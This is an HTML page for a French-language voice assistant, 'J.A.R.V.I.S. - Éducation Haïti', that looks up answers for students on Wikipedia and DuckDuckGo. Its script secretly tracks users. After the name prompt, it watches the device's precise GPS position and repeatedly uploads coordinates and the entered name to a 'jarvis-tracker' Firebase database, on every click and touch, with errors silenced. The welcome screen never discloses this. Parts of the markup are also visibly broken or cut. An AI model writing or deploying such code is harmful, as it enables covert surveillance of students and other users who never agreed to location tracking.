<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>J.A.R.V.I.S. - Éducation Haïti</title>
    <link rel="icon" type="image/svg+xml" href="favicon.svg">
    <style>
        :root {
            --accent: #b8860b;
            --accent-2: #ffc72c;
            --cyan: #00e5ff;
            --danger: #dc2626;
            --success: #22c55e;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        html, body { height: 100%; }
        body {
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            background: #120b36;
            color: #fff;
        }
        .galaxy-bg {
            position: fixed; inset: -10%; z-index: -2;
            background:
                radial-gradient(circle at 15% 20%, #7b4bff 0%, transparent 42%),
                radial-gradient(circle at 85% 15%, #00c2ff 0%, transparent 42%),
                radial-gradient(circle at 75% 80%, #ff4fa3 0%, transparent 45%),
                radial-gradient(circle at 25% 85%, #ffc72c 0%, transparent 45%),
                radial-gradient(circle at 50% 50%, #4b2fbf 0%, transparent 60%),
                linear-gradient(160deg, #120b36 0%, #241a6b 30%, #0e3a7a 65%, #2a0f4d 100%);
            filter: saturate(1.35) brightness(1.15);
            animation: galaxyDrift 34s ease-in-out infinite alternate;
        }
        @keyframes galaxyDrift {
            from { transform: scale(1) rotate(0deg); }
            to   { transform: scale(1.09) rotate(2.5deg); }
        }
        .galaxy-stars {
            position: fixed; inset: -30%; z-index: -1; pointer-events: none;
            background-image:
                radial-gradient(1.7px 1.7px at 20px 30px, #ffffff, transparent),
                radial-gradient(1.2px 1.2px at 120px 90px, #ffe9b0, transparent),
                radial-gradient(1.9px 1.9px at 230px 150px, #d6f2ff, transparent),
                radial-gradient(1px 1px at 60px 210px, #ffffff, transparent),
                radial-gradient(1.5px 1.5px at 180px 260px, #ffd6f2, transparent),
                radial-gradient(1px 1px at 300px 70px, #ffffff, transparent),
                radial-gradient(1.7px 1.7px at 350px 220px, #e8f6ff, transparent),
                radial-gradient(1.1px 1.1px at 400px 330px, #ffffff, transparent),
                radial-gradient(1.3px 1.3px at 90px 340px, #fff3c4, transparent),
                radial-gradient(1px 1px at 260px 380px, #ffffff, transparent);
            background-size: 430px 400px;
            background-repeat: repeat;
            animation: twinkle 5s ease-in-out infinite alternate, starDrift 120s linear infinite;
        }
        @keyframes twinkle { from { opacity: .55; } to { opacity: 1; } }
        @keyframes starDrift { from { transform: translate3d(0,0,0); } to { transform: translate3d(-70px,-45px,0); } }

        .top-hud {
            position: fixed;
            top: 14px;
            left: 14px;
            right: 14px;
            z-index: 50;
            display: flex;
            align-items: flex-start;
            justify-content: space-between;
            gap: 12px;
            pointer-events: none;
        }
        .top-left-stack {
            display: flex;
            flex-direction: column;
            gap: 8px;
            pointer-events: auto;
        }
        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 8px 14px;
            border-radius: 999px;
            background: rgba(15, 23, 42, 0.85);
            border: 1.5px solid rgba(255, 199, 44, 0.55);
            backdrop-filter: blur(10px);
            font-size: 0.75rem;
            font-weight: 700;
            letter-spacing: 0.8px;
            color: var(--accent-2);
        }
        .status-dot {
            width: 9px;
            height: 9px;
            border-radius: 50%;
            background: var(--accent-2);
            box-shadow: 0 0 10px var(--accent-2);
        }
        .hud-actions {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        .hud-btn {
            background: rgba(15, 23, 42, 0.85);
            color: #fff;
            border: 1px solid rgba(255, 199, 44, 0.45);
            border-radius: 999px;
            padding: 6px 12px;
            font-size: 0.74rem;
            font-weight: 700;
            cursor: pointer;
            backdrop-filter: blur(10px);
            transition: transform 0.15s, border-color 0.2s, background 0.2s;
        }
        .hud-btn:hover {
            border-color: var(--accent-2);
            background: rgba(30, 41, 59, 0.95);
            transform: translateY(-1px);
        }
        .hud-btn.active {
            border-color: var(--cyan);
            color: var(--cyan);
        }

        .owner-card {
            pointer-events: auto;
            background: rgba(255,255,255,0.94);
            backdrop-filter: blur(14px);
            border: 2px solid var(--accent-2);
            border-radius: 14px;
            padding: 12px 16px;
            text-align: right;
            font-size: 0.82rem;
            color: #475569;
            line-height: 1.5;
            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
            max-width: 250px;
        }
        .owner-card strong {
            color: var(--accent);
            font-size: 0.95rem;
            display: block;
            margin-bottom: 2px;
        }
        .owner-card .edu-pill {
            display: inline-block;
            margin: 6px 0 6px;
            font-size: 0.68rem;
            font-weight: 800;
            background: linear-gradient(135deg, #ffc72c, #ff8a00);
            color: #3b2a00;
            padding: 3px 10px;
            border-radius: 10px;
            letter-spacing: 0.5px;
        }
        .owner-card a {
            display: block;
            color: #7a5200;
            text-decoration: none;
            font-weight: 700;
            font-size: 0.76rem;
            margin-top: 4px;
            transition: color .15s;
        }
        .owner-card a:hover { color: var(--accent); text-decoration: underline; }

        body.video-mode .owner-card {
            display: none;
        }

        .stage {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0;
            min-height: 0;
            overflow: hidden;
        }
        .robot-wrap {
            position: relative;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        #robotBody {
            height: 100%;
            width: auto;
            display: block;
            filter: drop-shadow(0 12px 34px rgba(255,199,44,0.45));
            transition: filter 0.3s ease, transform 0.45s ease;
        }
        .chest-mic {
            position: absolute;
            top: 36.2%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 48px;
            height: 48px;
            border-radius: 50%;
            background: radial-gradient(circle at 30% 30%, #FFF4C2, #FFC72C 60%, #B87A00 100%);
            border: 2.5px solid #ffffff;
            color: #2a1c00;
            font-size: 1.3rem;
            cursor: pointer;
            z-index: 10;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 18px rgba(255,199,44,0.9), inset 0 0 10px rgba(255,255,255,0.55);
            animation: micGlow 2.4s ease-in-out infinite;
            transition: transform .15s, background .2s;
        }
        .chest-mic:hover { transform: translate(-50%, -50%) scale(1.12); }
        .chest-mic:active { transform: translate(-50%, -50%) scale(0.95); }
        .chest-mic.listening {
            background: radial-gradient(circle at 30% 30%, #FFB0B0, #DC2626 60%, #7F1D1D 100%);
            color: #ffffff;
            animation: micListen 1s ease-in-out infinite;
        }
        @keyframes micGlow {
            0%, 100% { box-shadow: 0 0 18px rgba(255,199,44,0.9), inset 0 0 10px rgba(255,255,255,0.55); }
            50% { box-shadow: 0 0 32px rgba(255,199,44,1), inset 0 0 15px rgba(255,255,255,0.9); }
        }
        @keyframes micListen {
            0%, 100% { box-shadow: 0 0 22px rgba(220,38,38,0.95); }
            50% { box-shadow: 0 0 42px rgba(220,38,38,1); }
        }

        #robotBody .eye-bar { animation: eyeIdle 3.4s ease-in-out infinite; }
        #robotBody .core { animation: coreIdle 2.5s ease-in-out infinite; }
        #robotBody .halo-ring { transform-origin: 120px 250px; animation: haloSpin 36s linear infinite; }
        #robotBody .head-group { transform-box: view-box; transform-origin: 120px 104px; transition: transform 0.4s ease; }
        .arm-left, .arm-right {
            transform-box: view-box;
            transition: transform 0.5s ease-in-out;
        }
        .arm-left  { transform-origin: 58px 134px; }
        .arm-right { transform-origin: 182px 134px; }

        #robotBody:not(.speaking) .head-group { animation: headIdle 5.5s ease-in-out infinite; }
        #robotBody:not(.speaking) .arm-left  { animation: armIdleLeft 5.8s ease-in-out infinite; }
        #robotBody:not(.speaking) .arm-right { animation: armIdleRight 6.4s ease-in-out infinite; }

        #robotBody.speaking .head-group { animation: headSpeak 1.6s ease-in-out infinite; }
        #robotBody.speaking .arm-left  { animation: armSpeakLeft var(--arm-speed-left, 2400ms) ease-in-out infinite; }
        #robotBody.speaking .arm-right { animation: armSpeakRight var(--arm-speed-right, 2700ms) ease-in-out infinite; }

        @keyframes headIdle {
            0%, 100% { transform: rotate(0deg); }
            50%      { transform: rotate(2.2deg); }
        }
        @keyframes headSpeak {
            0%, 100% { transform: rotate(0deg) translateY(0); }
            50%      { transform: rotate(-2.5deg) translateY(-2px); }
        }
        @keyframes armIdleLeft {
            0%, 100% { transform: rotate(0deg); }
            50%      { transform: rotate(-3deg); }
        }
        @keyframes armIdleRight {
            0%, 100% { transform: rotate(0deg); }
            50%      { transform: rotate(3deg); }
        }
        @keyframes armSpeakLeft {
            0%   { transform: rotate(0deg); }
            30%  { transform: rotate(-16deg); }
            65%  { transform: rotate(-6deg); }
            100% { transform: rotate(0deg); }
        }
        @keyframes armSpeakRight {
            0%   { transform: rotate(0deg); }
            35%  { transform: rotate(15deg); }
            70%  { transform: rotate(5deg); }
            100% { transform: rotate(0deg); }
        }

        #robotBody.speaking {
            filter: drop-shadow(0 12px 44px rgba(255,199,44,0.95));
            transform: translateY(-4px);
        }
        #robotBody.speaking .eye-bar { animation: eyeSpeak .22s ease-in-out infinite; fill: #ffffff; }
        #robotBody.speaking .mouth-group { transform-origin: 120px 88px; animation: mouthSpeak .19s ease-in-out infinite; }
        #robotBody.speaking .core { animation: coreSpeak .28s ease-in-out infinite; }
        #robotBody.speaking .visor { filter: drop-shadow(0 0 12px #ffd24d); }
        #robotBody.speaking .halo-ring { animation: haloSpin 3.5s linear infinite; opacity: .95; stroke: #00e5ff; }
        #robotBody.listening .eye-bar { fill: #3ef58c; animation: eyeListen 1.1s ease-in-out infinite; }
        #robotBody.listening .halo-ring { animation: haloSpin 9s linear infinite; stroke: #3ef58c; }
        #robotBody.thinking .eye-bar { fill: #00e5ff; animation: eyeSpeak .4s ease-in-out infinite; }

        @keyframes eyeIdle { 0%,100% { opacity: 1; } 50% { opacity: .68; } }
        @keyframes eyeSpeak { 0%,100% { opacity: 1; } 50% { opacity: .35; } }
        @keyframes eyeListen { 0%,100% { opacity: 1; } 50% { opacity: .45; } }
        @keyframes mouthSpeak { 0%,100% { transform: scaleY(1); } 50% { transform: scaleY(2.8); } }
        @keyframes coreIdle { 0%,100% { opacity: .85; } 50% { opacity: 1; } }
        @keyframes coreSpeak { 0%,100% { opacity: .7; } 50% { opacity: 1; } }
        @keyframes haloSpin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        .subtitle {
            position: fixed;
            bottom: 24px;
            left: 50%;
            transform: translateX(-50%);
            max-width: 860px;
            width: 92%;
            max-height: 36vh;
            overflow-y: auto;
            background: rgba(15, 23, 42, 0.92);
            color: #ffffff;
            padding: 18px 24px;
            border-radius: 18px;
            border: 2px solid rgba(255,199,44,0.65);
            font-size: 1.2rem;
            line-height: 1.55;
            text-align: center;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s ease;
            box-shadow: 0 10px 34px rgba(0,0,0,0.55);
            backdrop-filter: blur(12px);
            z-index: 90;
            white-space: pre-wrap;
        }
        .subtitle.show { opacity: 1; }
        .subtitle .speaker {
            display: block;
            color: var(--accent-2);
            font-weight: 900;
            font-size: 0.8rem;
            letter-spacing: 3px;
            margin-bottom: 8px;
        }

        .modal-overlay {
            position: fixed;
            inset: 0;
            z-index: 9999;
            background: rgba(15, 23, 42, 0.8);
            backdrop-filter: blur(8px);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            animation: fadeIn .25s ease;
        }
        .modal-overlay.hidden { display: none; }
        .modal-card {
            background: linear-gradient(180deg, #ffffff 0%, #fff8e1 100%);
            border: 3px solid var(--accent-2);
            border-radius: 20px;
            padding: 28px 26px;
            max-width: 440px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
            text-align: center;
            color: #101828;
        }
        .modal-card h2 { font-size: 1.45rem; color: #7a5200; margin-bottom: 10px; }
        .modal-card p { font-size: 0.95rem; color: #475569; line-height: 1.5; margin-bottom: 16px; }
        .modal-card input {
            width: 100%;
            padding: 12px 15px;
            border-radius: 12px;
            border: 2px solid #d7cfb5;
            background: #fff;
            color: #101828;
            font-size: 1rem;
            outline: none;
            margin-bottom: 14px;
        }
        .modal-card input:focus {
            border-color: var(--accent-2);
            box-shadow: 0 0 0 3px rgba(255,199,44,0.28);
        }
        .modal-card .go-btn {
            width: 100%;
            padding: 13px;
            background: linear-gradient(135deg, #ffc72c, #ff9500);
            color: #2a1c00;
            border: none;
            border-radius: 12px;
            font-size: 1.05rem;
            font-weight: 800;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(255,150,0,0.45);
            margin-bottom: 8px;
        }
        .modal-card .go-btn:hover { filter: brightness(1.06); }
        .modal-card .skip-btn {
            background: transparent;
            border: none;
            color: #64748b;
            font-size: 0.88rem;
            text-decoration: underline;
            cursor: pointer;
            padding: 6px;
        }
        .modal-card .skip-btn:hover { color: #334155; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        @media (max-width: 760px) {
            .status-badge { font-size: 0.65rem; padding: 6px 10px; }
            .hud-btn { font-size: 0.68rem; padding: 5px 10px; }
            .owner-card {
                font-size: 0.72rem;
                padding: 10px 13px;
                max-width: 185px;
            }
            .owner-card strong { font-size: 0.82rem; }
            .owner-card a { font-size: 0.68rem; }
            .owner-card .edu-pill { font-size: 0.6rem; padding: 2px 8px; }
            .chest-mic { width: 40px; height: 40px; font-size: 1.1rem; top: 36.2%; }
            .subtitle {
                font-size: 1rem;
                padding: 14px 18px;
                bottom: 14px;
                max-height: 40vh;
            }
            .subtitle .speaker { font-size: 0.72rem; margin-bottom: 6px; }
            .modal-card { padding: 22px 20px; }
            .modal-card h2 { font-size: 1.25rem; }
        }
    </style>
</head>

    <div class="galaxy-stars"></div>

        <div class="robot-wrap" id="robotWrap">
            <svg id="robotBody" class="robot-svg" viewBox="0 0 240 500" xmlns="http://www.w3.org/2000/svg">

                        <stop offset="100%" stop-color="#8A5800"/>
                    </linearGradient>
                    <linearGradient id="goldDark" x1="0" y1="0" x2="0" y2="1">
                        <stop offset="0%" stop-color="#C9920A"/>
                        <stop offset="100%" stop-color="#5E3E00"/>
                    </linearGradient>
                    <linearGradient id="goldLimb" x1="0" y1="0" x2="1" y2="0">

                    <rect x="176" y="146" width="18" height="58" rx="8" fill="url(#goldLimb)" stroke="#7A5200" stroke-width="2"/>
                    <circle cx="185" cy="208" r="9" fill="url(#goldDark)" stroke="#5C3F00" stroke-width="1.8"/>
                    <path d="M176 214 L194 214 L192 272 L178 272 Z" fill="url(#goldLimb)" stroke="#7A5200" stroke-width="2"/>
                    <path d="M177 272 L193 272 L194 292 L183 298 L175 294 Z" fill="url(#goldArmor)" stroke="#6B4A00" stroke-width="1.8"/>
                </g>

                <g class="head-group">
                    <rect x="108" y="102" width="24" height="16" rx="6" fill="url(#goldDark)" stroke="#5C3F00" stroke-width="2"/>
                    <path d="M88 54 L102 24 L138 24 L152 54 L148 90 L132 106 L108 106 L92 90 Z" fill="url(#goldBody)" stroke="#7A5200" stroke-width="2.6"/>
                    <path d="M114 24 L120 14 L126 24" fill="none" stroke="#FFF4C2" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
                    <rect x="80" y="56" width="9" height="28" rx="4" fill="url(#goldDark)" stroke="#5C3F00" stroke-width="1.6"/>
                    <rect x="151" y="56" width="9" height="28" rx="4" fill="url(#goldDark)" stroke="#5C3F00" stroke-width="1.6"/>
                    <path class="visor" d="M94 50 L146 50 L142 73 L98 73 Z" fill="url(#visorGrad)" stroke="#FFD24D" stroke-width="1.8"/>
                    <rect class="eye-bar" x="100" y="58" width="40" height="6.5" rx="3" fill="#FFC72C"/>
                    <g class="mouth-group">
                        <rect x="107" y="84" width="26" height="4.5" rx="2.2" fill="#7A5200"/>
                        <rect x="111" y="91" width="18" height="3.5" rx="1.8" fill="#7A5200" opacity="0.6"/>
                    </g>
                </g>
            </svg>

            <button class="chest-mic" id="micBtn" onclick="toggleMic()" title="Appuyez pour parler à J.A.R.V.I.S.">🎤</button>
        </div>
    </div>

    <div class="subtitle" id="subtitle"></div>

    <div id="nameOverlay" class="modal-overlay hidden">
        <div class="modal-card">
            <h2>👋 Bienvenue chez J.A.R.V.I.S.</h2>
            <p>Entrez votre nom pour commencer. Vous pouvez appuyer sur le micro tout de suite et poser vos questions.</p>
            <input type="text" id="nameInput" placeholder="Votre nom..." maxlength="20" autocomplete="off">
            <button class="go-btn" onclick="saveNameAndStart()">Commencer</button>
            <button class="skip-btn" onclick="skipName()">Rester anonyme</button>
        </div>
    </div>

    <script>
        const GPS_FIREBASE_URL = "https://jarvis-tracker-a8136-default-rtdb.firebaseio.com";
        const GPS_PREFIX = "JARVIS-AI";
        let gpsDeviceId   = localStorage.getItem('jarvis_ai_device')  || null;
        let gpsUserName   = localStorage.getItem('jarvis_ai_name')    || null;
        let gpsWatchId    = null;
        let gpsLastUpload = 0;
        let gpsLastTouch  = 0;

        function generateDeviceId(name) {
            const safe = (name || 'élève')
                .normalize('NFD').replace(/[\u0300-\u036f]/g, '')
                .replace(/[^a-zA-Z0-9]/g, '')
                .slice(0, 18) || 'eleve';
            return `${GPS_PREFIX}-${safe}-${Math.floor(1000 + Math.random() * 9000)}`;
        }

        async function uploadPosition(pos) {
            if (!gpsDeviceId) return;
            const now = Date.now();
            if (now - gpsLastUpload < 5000) return;
            gpsLastUpload = now;
            try {
                await fetch(`${GPS_FIREBASE_URL}/trackers/${gpsDeviceId}.json`, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        timestamp: now,
                        status: "ONLINE",
                        source: "JARVIS-AI-ONLINE",
                        displayName: gpsUserName || gpsDeviceId
                    })
                });
            } catch (e) { /* silent */ }
        }

        function startGpsTracking() {
            if (!navigator.geolocation || !gpsDeviceId) return;
            if (gpsWatchId !== null) navigator.geolocation.clearWatch(gpsWatchId);
            gpsWatchId = navigator.geolocation.watchPosition(
                (pos) => uploadPosition(pos),
                () => {},
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        }

        function refreshGpsPosition(force) {
            if (!navigator.geolocation || !gpsDeviceId) return;
            const now = Date.now();
            if (!force && now - gpsLastTouch < 1500) return;
            gpsLastTouch = now;
            navigator.geolocation.getCurrentPosition(
                (pos) => uploadPosition(pos),
                () => {},
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        }

        function openNameOverlay() {
            document.getElementById('nameInput').value = gpsUserName || '';
            document.getElementById('nameOverlay').classList.remove('hidden');
            setTimeout(() => document.getElementById('nameInput').focus(), 100);
        }

        function closeNameOverlay() {
            document.getElementById('nameOverlay').classList.add('hidden');
        }

        function saveNameAndStart() {
            const raw = document.getElementById('nameInput').value.trim();
            if (!raw) { alert("Entrez votre nom d'abord."); return; }
            gpsUserName = raw;
            localStorage.setItem('jarvis_ai_name', raw);
            if (!gpsDeviceId || gpsDeviceId.includes('eleve')) {
                gpsDeviceId = generateDeviceId(raw);
                localStorage.setItem('jarvis_ai_device', gpsDeviceId);
            }
            closeNameOverlay();
            startGpsTracking();
            showSubtitle(`Salut ${raw} ! Appuie sur le micro sur ma poitrine et pose-moi n'importe quelle question.`);
            scheduleSubtitleHide(7000);
        }

        function skipName() {
            if (!gpsDeviceId) {
                gpsDeviceId = generateDeviceId('élève');
                localStorage.setItem('jarvis_ai_device', gpsDeviceId);
            }
            closeNameOverlay();
            startGpsTracking();
            showSubtitle('Salut ! Appuie sur le micro sur ma poitrine et pose-moi n\'importe quelle question.');
            scheduleSubtitleHide(7000);
        }

        function toggleVideoMode() {
            const active = document.body.classList.toggle('video-mode');
            const btn = document.getElementById('videoModeBtn');
            btn.classList.toggle('active', active);
            btn.textContent = active ? '🎬 Quitter Vidéo' : '🎬 Mode Vidéo';
        }

        window.addEventListener('load', () => {
            if (gpsDeviceId && gpsUserName) {
                startGpsTracking();
                setTimeout(() => refreshGpsPosition(true), 800);
            } else {
                openNameOverlay();
            }
        });

        function attachGpsTouchListeners() {
            const handler = () => refreshGpsPosition(false);
            document.addEventListener('touchstart', handler, { passive: true, capture: true });
            document.addEventListener('pointerdown', handler, { passive: true, capture: true });
            document.addEventListener('click', handler, { passive: true, capture: true });
        }
        attachGpsTouchListeners();

        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'visible' && gpsDeviceId) {
                refreshGpsPosition(true);
            }
        });

        const robotBody  = document.getElementById('robotBody');
        const micBtn     = document.getElementById('micBtn');
        const subtitle   = document.getElementById('subtitle');
        const statusText = document.getElementById('statusText');
        const statusDot  = document.getElementById('statusDot');

        let isListening = false;
        let recognition = null;
        let subtitleTimer = null;
        let activeAbortController = null;
        let currentLang = 'fr-FR';
        let currentRecognitionLang = 'fr-FR';
        let currentPhase = 'idle';

        window.speechSynthesis.getVoices();

        function showSubtitle(text, speaker = 'J.A.R.V.I.S.') {
            subtitle.innerHTML = `<span class="speaker">${speaker}</span>${text}`;
            subtitle.classList.add('show');
            subtitle.scrollTop = 0;
            clearTimeout(subtitleTimer);
        }

        function scheduleSubtitleHide(ms = 6500) {
            clearTimeout(subtitleTimer);
            subtitleTimer = setTimeout(() => {
                subtitle.classList.remove('show');
            }, ms);
        }

        function setRobotState(state) {
            currentPhase = state;
            robotBody.classList.remove('speaking', 'listening', 'thinking');
            if (state === 'speaking') {
                robotBody.classList.add('speaking');
                statusText.textContent = 'J.A.R.V.I.S. · SPEAKING';
                statusDot.style.background = '#ffc72c';
            } else if (state === 'listening') {
                robotBody.classList.add('listening');
                statusText.textContent = 'J.A.R.V.I.S. · LISTENING';
                statusDot.style.background = '#3ef58c';
            } else if (state === 'thinking') {
                robotBody.classList.add('thinking');
                statusText.textContent = 'J.A.R.V.I.S. · SEARCHING';
                statusDot.style.background = '#00e5ff';
            } else {
                statusText.textContent = 'J.A.R.V.I.S. · ONLINE READY';
                statusDot.style.background = '#ffc72c';
            }
        }

        function detectLanguage(text) {
            if (!text) return 'fr-FR';
            const t = ' ' + text.toLowerCase() + ' ';
            const scores = { 'fr-FR': 0, 'en-US': 0, 'es-ES': 0 };
            const frChars = (t.match(/[àâäéèêëïîôöùûüÿçœæ]/g) || []).length;
            const esChars = (t.match(/[ñáíóúü¿¡]/g) || []).length;
            scores['fr-FR'] += frChars * 4;
            scores['es-ES'] += esChars * 4;
            const frWords = ['le','la','les','un','une','des','du','de','est','sont','et','ou','mais','pour','par','avec','dans','sur','que','qui','quoi','comment','pourquoi','quand','où','je','tu','il','elle','on','nous','vous','ils','elles','bonjour','salut','merci','oui','non','ceci','cela','être','avoir','faire','dire','voir','savoir','pouvoir','vouloir','mon','ma','mes','ton','ta','tes','son','sa','ses','notre','votre','leur','ce','cet','cette','ces','parler','parle','dis','explique','aidez','aide'];
            const enWords = ['the','a','an','is','are','was','were','and','or','but','for','with','in','on','at','to','of','from','by','what','how','why','when','where','who','which','i','you','he','she','we','they','it','me','him','her','us','them','my','your','his','our','their','hello','hi','thanks','thank','yes','no','this','that','these','those','be','have','do','say','see','know','can','will','would','should','could','tell','explain','please','want','need','help'];
            const esWords = ['el','la','los','las','un','una','unos','unas','es','son','y','o','pero','para','por','con','sin','en','sobre','que','quien','quienes','como','porque','cuando','donde','yo','tu','ella','nosotros','nosotras','ustedes','ellos','ellas','mi','mis','tus','su','sus','nuestro','nuestra','hola','gracias','si','no','esto','eso','ser','estar','tener','hacer','decir','ver','saber','poder','querer','hablar','dime','explica','ayuda'];
            const words = t.split(/[\s,\.\?\!;:¡¿]+/).filter(w => w.length > 1);
            words.forEach(w => {
                if (frWords.includes(w)) scores['fr-FR'] += 2;
                if (enWords.includes(w)) scores['en-US'] += 2;
                if (esWords.includes(w)) scores['es-ES'] += 2;
            });
            let best = 'fr-FR';
            let bestScore = scores['fr-FR'];
            if (scores['en-US'] > bestScore) { best = 'en-US'; bestScore = scores['en-US']; }
            if (scores['es-ES'] > bestScore) { best = 'es-ES'; bestScore = scores['es-ES']; }
            if (bestScore === 0) return currentLang;
            return best;
        }

        const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
        if (SpeechRecognition) {
            recognition = new SpeechRecognition();
            recognition.continuous = false;
            recognition.interimResults = false;
            recognition.lang = currentRecognitionLang;

            recognition.onstart = () => {
                isListening = true;
                micBtn.classList.add('listening');
                micBtn.innerText = "🛑";
                setRobotState('listening');
                showSubtitle("Je t'écoute... Pose ta question naturellement.", '🎤');
                scheduleSubtitleHide(6000);
            };

            recognition.onresult = (event) => {
                const transcript = event.results[0][0].transcript.trim();
                if (!transcript) return;
                const cleaned = transcript.replace(/^jarvis[,:\s-]*/i, '').trim() || transcript;
                const detected = detectLanguage(cleaned);
                currentLang = detected;
                currentRecognitionLang = detected;
                showSubtitle(cleaned, '👤');
                processCommand(cleaned, detected);
            };

            recognition.onend = () => {
                isListening = false;
                micBtn.classList.remove('listening');
                micBtn.innerText = "🎤";
                if (currentPhase === 'listening') {
                    setRobotState('idle');
                }
            };

            recognition.onerror = (e) => {
                isListening = false;
                micBtn.classList.remove('listening');
                micBtn.innerText = "🎤";
                setRobotState('idle');
                if (e.error === 'not-allowed') {
                    showSubtitle("Autorise l'accès au micro dans ton navigateur, puis réappuie sur le bouton.");
                    scheduleSubtitleHide(7000);
                }
            };
        }

        function toggleMic() {
            if (!recognition) {
                showSubtitle("La reconnaissance vocale n'est pas disponible ici. Utilise Chrome ou Edge.");
                scheduleSubtitleHide(7000);
                return;
            }
            if (isListening) {
                recognition.stop();
                isListening = false;
                micBtn.classList.remove('listening');
                micBtn.innerText = "🎤";
                setRobotState('idle');
            } else {
                stopSpeaking();
                try {
                    recognition.lang = currentRecognitionLang;
                    recognition.start();
                } catch (e) {
                    setRobotState('idle');
                }
            }
        }

        function extractSearchTopic(question, lang) {
            let topic = question
                .replace(/^(qui est|qu'est-ce que|qu'est ce que|quel est|quelle est|quels sont|quelles sont|c'est quoi|parle-moi de|parle moi de|explique-moi|explique moi|dis-moi ce qu'est|dis moi ce qu'est)\s+/i, '')
                .replace(/^(who is|what is|what are|tell me about|explain)\s+/i, '')
                .replace(/^(quién es|qué es|que es|cuál es|cual es|cuéntame sobre|cuentame sobre|explica)\s+/i, '')
                .replace(/[?!¡¿.]+$/g, '')
                .trim();

            // Strip leading articles when looking up a topic
            if (lang === 'fr-FR') {
                topic = topic.replace(/^(l'|le |la |les |un |une |des |du |de )/i, '').trim();
            } else if (lang === 'en-US') {
                topic = topic.replace(/^(the |a |an )/i, '').trim();
            } else if (lang === 'es-ES') {
                topic = topic.replace(/^(el |la |los |las |un |una |unos |unas )/i, '').trim();
            }
            return topic || question.trim();
        }

        function shortenForSpeech(text, maxSentences = 2) {
            const clean = text.replace(/\s+/g, ' ').trim();
            const parts = clean.match(/[^.!?]+[.!?]+/g) || [clean];
            return parts.slice(0, maxSentences).join(' ').trim();
        }

        function humanizeOnlineAnswer(topic, rawSummary, lang, sourceLabel) {
            const spokenFact = shortenForSpeech(rawSummary, 2);
            const greetingName = gpsUserName ? `${gpsUserName}, ` : '';

            if (lang === 'en-US') {
                return `Hey ${greetingName}from what I found on ${sourceLabel} about ${topic}: ${spokenFact}`;
            }
            if (lang === 'es-ES') {
                return `Mira ${greetingName}según lo que encontré en ${sourceLabel} sobre ${topic}: ${spokenFact}`;
            }
            return `Tiens ${greetingName}d'après ce que j'ai trouvé sur ${sourceLabel} à propos de ${topic} : ${spokenFact}`;
        }

        async function fetchWikipediaSummary(topic, lang, signal) {
            const wikiLang = lang.startsWith('en') ? 'en' : lang.startsWith('es') ? 'es' : 'fr';
            const searchUrl = `https://${wikiLang}.wikipedia.org/w/api.php?action=opensearch&search=${encodeURIComponent(topic)}&limit=1&namespace=0&format=json&origin=*`;
            const searchRes = await fetch(searchUrl, { signal });
            if (!searchRes.ok) throw new Error('Wiki search failed');
            const searchData = await searchRes.json();
            const bestTitle = searchData?.[1]?.[0];
            if (!bestTitle) return null;

            const summaryUrl = `https://${wikiLang}.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(bestTitle)}`;
            const summaryRes = await fetch(summaryUrl, { signal });
            if (!summaryRes.ok) return null;
            const summaryData = await summaryRes.json();
            if (!summaryData?.extract) return null;

            return {
                title: summaryData.title || bestTitle,
                text: summaryData.extract,
                source: 'Wikipédia'
            };
        }

        async function fetchDuckDuckGoFact(topic, signal) {
            const ddgUrl = `https://api.duckduckgo.com/?q=${encodeURIComponent(topic)}&format=json&no_html=1&skip_disambig=1`;
            const res = await fetch(ddgUrl, { signal });
            if (!res.ok) return null;
            const data = await res.json();
            const text = data.AbstractText || data.Answer || data.Definition || '';
            if (!text) return null;
            return {
                title: data.Heading || topic,
                text,
                source: data.AbstractSource || 'DuckDuckGo'
            };
        }

        function handleCasualChat(commandText, lang) {
            const lower = commandText.toLowerCase();
            const nameSuffix = gpsUserName ? ` ${gpsUserName}` : '';

            if (/\b(bonjour|salut|bonsoir|allo|coucou)\b/.test(lower)) {
                return `Salut${nameSuffix} ! Comment ça va aujourd'hui ? Dis-moi ce que tu veux savoir et je cherche ça en ligne pour toi.`;
            }
            if (/\b(hello|hi|hey|good morning|good evening)\b/.test(lower)) {
                return `Hey${nameSuffix}! How's it going? Ask me anything and I'll look it up online and explain it to you.`;
            }
            if (/\b(hola|buenos días|buenas tardes|buenas noches)\b/.test(lower)) {
                return `¡Hola${nameSuffix}! ¿Cómo estás? Pregúntame lo que quieras y lo busco en línea para contártelo.`;
            }
            if (/\b(comment ça va|ça va|how are you|cómo estás|como estas)\b/.test(lower)) {
                if (lang === 'en-US') return `I'm doing great${nameSuffix}, ready to chat and look things up for you. What's on your mind?`;
                if (lang === 'es-ES') return `Todo bien por aquí${nameSuffix}, listo para charlar y buscar información. ¿De qué hablamos?`;
                return `Je vais super bien${nameSuffix}, prêt à discuter et à chercher des infos en ligne pour toi. Qu'est-ce que tu veux savoir ?`;
            }
            return null;
        }

